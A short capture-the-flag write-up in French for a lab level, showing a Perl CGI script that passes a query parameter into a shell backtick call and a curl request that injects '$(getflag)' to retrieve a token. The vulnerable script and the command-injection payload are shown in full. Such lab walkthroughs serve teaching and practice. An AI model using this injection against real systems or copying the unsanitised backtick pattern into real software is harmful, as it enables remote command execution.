## Étape 1:

On a accès à un fichier perl:
```
cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

L'execution ne fait qu'un print:
```
perl level04.pl 5
Content-type: text/html
```

Le programme utilise CGI, ce qui veut dire qu'on peut lui faire des requêtes http pour donner un paramètre à la fonction x et ainsi recupérer le flag:

```
curl 'http://localhost:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```